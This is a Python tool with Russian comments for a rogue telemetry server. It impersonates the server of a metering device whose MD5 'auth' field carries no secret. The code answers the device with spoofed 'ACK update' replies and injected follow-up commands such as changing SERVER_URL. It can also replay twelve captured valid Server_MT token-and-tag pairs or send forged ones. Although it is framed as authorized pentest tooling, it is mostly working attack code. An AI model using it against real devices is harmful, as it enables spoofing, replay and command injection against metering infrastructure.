#!/usr/bin/env python3
"""smt_rogue_server — стенд подмены сервера телеметрии (rogue server).

ТОЛЬКО ДЛЯ АВТОРИЗОВАННОГО ПЕНТЕСТА своего / переданного по договору оборудования.

Зачем
-----
Прибор (СГМ) отдаёт телеметрию на сервер и РАЗБИРАЕТ ответ сервера. Поле `auth`
в пакете — это `MD5(тело)` БЕЗ секретного ключа, то есть контроль целостности, а
НЕ аутентификация отправителя/сервера (см. smt_server.auth_check). Значит прибор
не может отличить настоящий сервер от поддельного → сервер подменяется тривиально.

В прошивке есть ветка ответа «ACK update» (0801E594), гейтящаяся сравнением длины
принятого ответа. Этот стенд позволяет в лаборатории проверить, ЧТО прибор делает
с ответом поддельного сервера: принимает ли «ACK update», реагирует ли на
директивы «сверху» (обновление конфига/расписания/адреса сервера), шлёт ли что-то
в ответ на нашу реплику.

Как навести прибор на наш сервер
--------------------------------
Любым легитимным для пентеста способом: задать на приборе SERVER_URL = наш host:port
(через вкладку «Команды» контроллера, если есть доступ), либо сетевым
перенаправлением (DNS/маршрут/APN) в стенде. Прибор сам подключится сюда.

Стенд НЕ атакует сеть и НЕ рассылает ничего массово — он лишь принимает соединение
конкретного прибора и отвечает тем, что задал оператор, фиксируя реакцию.

Запуск
------
  python3 smt_rogue_server.py --port 40000                 # базово: DATA ACCEPT
  python3 smt_rogue_server.py --port 40000 --respond update # пробуем «ACK update»
  python3 smt_rogue_server.py --port 40000 --interactive    # оператор сам вводит ответ
  python3 smt_rogue_server.py --port 40000 --respond raw --raw 'ACK update\r\n'
  python3 smt_rogue_server.py --port 40000 --followup 'SET SERVER_URL=...\r\n'
  python3 smt_rogue_server.py --port 40000 --respond server_mt --server-mt 0   # replay
  python3 smt_rogue_server.py --port 40000 --respond server_mt --server-mt forge
"""
from __future__ import annotations

import argparse
import datetime
import json
import os
import socket
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
SESS = os.path.join(HERE, "sessions")

try:
    import smt_server as srv
except Exception:
    srv = None


# Поле Server_MT прибора хранит 37 байт: 33-символьный токен на алфавите
# 012345678ABCDEFGHIJKLMNOPQRSTUVWXYZ (35 символов, без «9») + 4-байтовый
# проприетарный тег (не стандартная CRC/хэш — проверено: CRC32×8, CRC16×9,
# MD5/SHA1/SHA256, Adler32, FNV-1/1a, DJB2, sdbm, Jenkins OAT, sum/xor — ни
# один вариант не совпал). Ниже — 12 РЕАЛЬНО ЗАХВАЧЕННЫХ валидных пар,
# используются ТОЛЬКО для replay-теста (не позволяют вычислить алгоритм тега,
# но проверяют, различает ли прибор валидный тег от произвольного).
SERVER_MT_ALPHABET = "012345678ABCDEFGHIJKLMNOPQRSTUVWXYZ"

SERVER_MT_SAMPLES = [
    ("6LH54TZBTUM7JA8OAUYE3KWB1AOOAMRRG", bytes.fromhex("2305A719")),
    ("ULIYSEC2O38YQ8TQJW77V5MI2COAC0I2N", bytes.fromhex("4EB36D89")),
    ("620AX6RY315E2HZYPNQRZWI7SLUX3KAWG", bytes.fromhex("039B2655")),
    ("1860O7KWXKFYZBQVH0RQ3GM0OET0KWCEZ", bytes.fromhex("4D58C769")),
    ("S0L72QXRZKQ0352LFWW0XWSTYGDIKFVBD", bytes.fromhex("2F87FE37")),
    ("WWO2T6130LDMO6SSCWOVTESMM6NREEJ05", bytes.fromhex("0ACEAFD9")),
    ("EK81WFTGZBFKMOR2WIFCLE7F5HQS03JZ6", bytes.fromhex("0B58B14D")),
    ("VJRB02JBHDOYMGNC8UMM1OKO17J0SQ73D", bytes.fromhex("2AA60687")),
    ("YNHXIPYCQXA0X0X4430DFEGCV3CJFMUEM", bytes.fromhex("0E5EBD25")),
    ("5HGL16KX4QR35GHP0Z8S3WTNJDSB4CJS6", bytes.fromhex("04306F9F")),
    ("U2VNYBLK56JYUAY0KV6M42U4ERVNZEBCP", bytes.fromhex("3C37EDF1")),
    ("LEPF1H6UQWJLQWVSS6LMMV7KPK6VDU6J5", bytes.fromhex("41852171")),
]


def forge_server_mt(rng=None) -> bytes:
    """Синтаксически валидный (по алфавиту/длине) токен со СЛУЧАЙНЫМ тегом.

    Тег заведомо неверный — цель не подделать реальный тег (алгоритм
    неизвестен), а проверить: если прибор всё равно ПРИНИМАЕТ такую запись,
    значит тег на приёме не проверяется (или проверяется не там, где мы
    отвечаем). Если отклоняет/игнорирует — тег валидируется.
    """
    import random
    rng = rng or random
    token = "".join(rng.choice(SERVER_MT_ALPHABET) for _ in range(33))
    tag = bytes(rng.randrange(256) for _ in range(4))
    return token.encode("ascii") + tag


def replay_server_mt(index: int) -> bytes:
    """Дословный повтор одного из реально захваченных валидных ответов
    (classic replay attack) — не требует знания алгоритма тега вообще."""
    token, tag = SERVER_MT_SAMPLES[index % len(SERVER_MT_SAMPLES)]
    return token.encode("ascii") + tag


BANNER = (
    "╔══════════════════════════════════════════════════════════════════╗\n"
    "║  ROGUE TELEMETRY SERVER — только для АВТОРИЗОВАННОГО пентеста      ║\n"
    "║  своего/переданного оборудования (договор, RoE).                  ║\n"
    "╚══════════════════════════════════════════════════════════════════╝"
)


def _unescape(s: str) -> bytes:
    """Преобразует введённые \\r \\n \\t \\xHH в реальные байты."""
    return s.encode("latin1", "replace").decode("unicode_escape").encode("latin1", "replace")


def analyse_inbound(buf: bytes) -> dict:
    """Разбирает входящий кадр прибора и проверяет auth (переиспуёт smt_server)."""
    rep = {"records": [], "raw_len": len(buf)}
    if srv is not None:
        try:
            rep = srv.parse_frame(buf)
        except Exception as exc:
            rep = {"records": [], "parse_error": str(exc)}
        auth = rep.get("auth")
        if auth:
            rep["auth_check"] = srv.auth_check(rep.get("text", ""), auth)
    return rep


def make_response(mode: str, n_records: int, raw: str | None, file: str | None,
                  server_mt: str | None = None) -> bytes:
    if mode == "accept":
        return f"DATA ACCEPT:{n_records}\r\n".encode("latin1")
    if mode == "update":
        return b"ACK update\r\n"
    if mode == "silent":
        return b""
    if mode == "raw":
        return _unescape(raw or "")
    if mode == "file":
        with open(file, "rb") as f:
            return f.read()
    if mode == "server_mt":
        spec = (server_mt or "0").strip().lower()
        if spec == "forge":
            return forge_server_mt()
        return replay_server_mt(int(spec) if spec else 0)
    return f"DATA ACCEPT:{n_records}\r\n".encode("latin1")


def log_session(addr, buf, rep, sent, reaction):
    os.makedirs(SESS, exist_ok=True)
    stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
    base = os.path.join(SESS, f"rogue_{stamp}_{addr[0].replace(':', '_')}_{addr[1]}")
    with open(base + ".log", "wb") as f:
        f.write(b"<<< INBOUND >>>\n" + buf +
                b"\n<<< SENT >>>\n" + sent +
                b"\n<<< REACTION >>>\n" + reaction)
    with open(base + ".json", "w", encoding="utf-8") as f:
        json.dump({"remote": addr, "inbound_len": len(buf), "parsed": rep,
                   "sent": sent.decode("latin1", "replace"),
                   "reaction": reaction.decode("latin1", "replace")},
                  f, ensure_ascii=False, indent=2)
    return base


def handle(conn, addr, args):
    conn.settimeout(args.idle)
    buf = b""
    while True:
        try:
            d = conn.recv(4096)
        except TimeoutError:
            break
        if not d:
            break
        buf += d
        if len(buf) > args.max_frame:
            print(f"  [!] кадр > {args.max_frame} байт — обрыв")
            break

    print("\n" + "═" * 70)
    print(f"[{datetime.datetime.now():%H:%M:%S}] подключился прибор {addr[0]}:{addr[1]}")
    print(f"  принято {len(buf)} байт")
    if buf:
        print("  ─ сырьё (latin1) ─")
        print("    " + buf.decode("latin1", "replace").replace("\n", "\n    "))

    rep = analyse_inbound(buf)
    n = len(rep.get("records", []))
    print(f"  разобрано записей: {n}")
    ac = rep.get("auth_check")
    if ac:
        matched = any(x.get("match") for x in ac)
        print(f"  auth (MD5 целостности) сходится: {matched}")
        print("  ⚠ ВЫВОД: это контроль целостности БЕЗ секрета — сервер прибором "
              "НЕ аутентифицируется. Подмена сервера возможна.")

    # выбор ответа
    if args.interactive:
        print("  ─ что отправить прибору? (Enter = DATA ACCEPT, поддержка \\r\\n\\xHH) ─")
        try:
            typed = input("  ответ> ")
        except EOFError:
            typed = ""
        sent = _unescape(typed) if typed.strip() else make_response("accept", n, None, None)
    else:
        sent = make_response(args.respond, n, args.raw, args.file, args.server_mt)
        if args.followup:
            sent += _unescape(args.followup)

    reaction = b""
    if sent:
        try:
            conn.sendall(sent)
            print(f"  → отправлено {len(sent)} байт: {sent!r}")
        except OSError as exc:
            print(f"  [!] ошибка отправки: {exc}")
    else:
        print("  → (ничего не отправлено, режим silent)")

    # слушаем реакцию прибора на наш ответ (признак downstream-обработки)
    if not args.no_reaction:
        conn.settimeout(args.reaction_wait)
        try:
            while True:
                d = conn.recv(4096)
                if not d:
                    break
                reaction += d
        except TimeoutError:
            pass
        if reaction:
            print(f"  ← ПРИБОР ОТВЕТИЛ на нашу реплику ({len(reaction)} байт):")
            print("    " + reaction.decode("latin1", "replace").replace("\n", "\n    "))
            print("  ⚠ Реакция на ответ сервера — повод проверить downstream-обработку "
                  "(конфиг/команды сверху).")
        else:
            print("  ← прибор молчит после нашего ответа (или закрыл соединение)")

    base = log_session(addr, buf, rep, sent, reaction)
    print(f"  сохранено: {base}.log / .json")
    with __import__("contextlib").suppress(Exception):
        conn.close()


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=40000)
    ap.add_argument("--respond",
                    choices=["accept", "update", "silent", "raw", "file", "server_mt"],
                    default="accept", help="что отвечать прибору")
    ap.add_argument("--raw", help="ответ для --respond raw (поддержка \\r\\n\\xHH)")
    ap.add_argument("--file", help="файл-ответ для --respond file")
    ap.add_argument("--server-mt", default="0",
                    help="для --respond server_mt: индекс образца 0-11 (replay реально "
                         "захваченного валидного token+tag) или 'forge' (синтаксически "
                         "валидный токен со случайным тегом — проверка, валидируется ли тег)")
    ap.add_argument("--followup", help="добить дополнительной строкой после ACK "
                                       "(проба server→device команды)")
    ap.add_argument("--interactive", action="store_true",
                    help="спрашивать оператора, что отправить, на каждом соединении")
    ap.add_argument("--idle", type=float, default=0.8, help="таймаут склейки входящего кадра")
    ap.add_argument("--reaction-wait", type=float, default=2.0,
                    help="сколько ждать реакции прибора после нашего ответа")
    ap.add_argument("--no-reaction", action="store_true", help="не слушать реакцию")
    ap.add_argument("--max-frame", type=int, default=2 * 1024 * 1024)
    ap.add_argument("--once", action="store_true", help="обслужить одно соединение и выйти")
    args = ap.parse_args()

    print(BANNER)
    if srv is None:
        print("[!] smt_server недоступен — разбор/auth-проверка ограничены.")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((args.host, args.port))
    except OSError as exc:
        sys.exit(f"[!] не удалось открыть {args.host}:{args.port}: {exc}")
    s.listen(5)
    print(f"[*] слушаю {args.host}:{args.port} — жду сессию прибора "
          f"(режим ответа: {args.respond}{' +followup' if args.followup else ''})")
    print(f"[*] наведи прибор сюда: SERVER_URL = <этот host>:{args.port} (вкладка «Команды») "
          "или сетевым перенаправлением. Ctrl+C — стоп.")
    try:
        while True:
            conn, addr = s.accept()
            try:
                handle(conn, addr, args)
            except Exception as exc:
                print(f"  [!] ошибка обработки {addr}: {exc}")
            if args.once:
                break
    except KeyboardInterrupt:
        print("\n[*] остановлено оператором")
    finally:
        with __import__("contextlib").suppress(Exception):
            s.close()


if __name__ == "__main__":
    main()
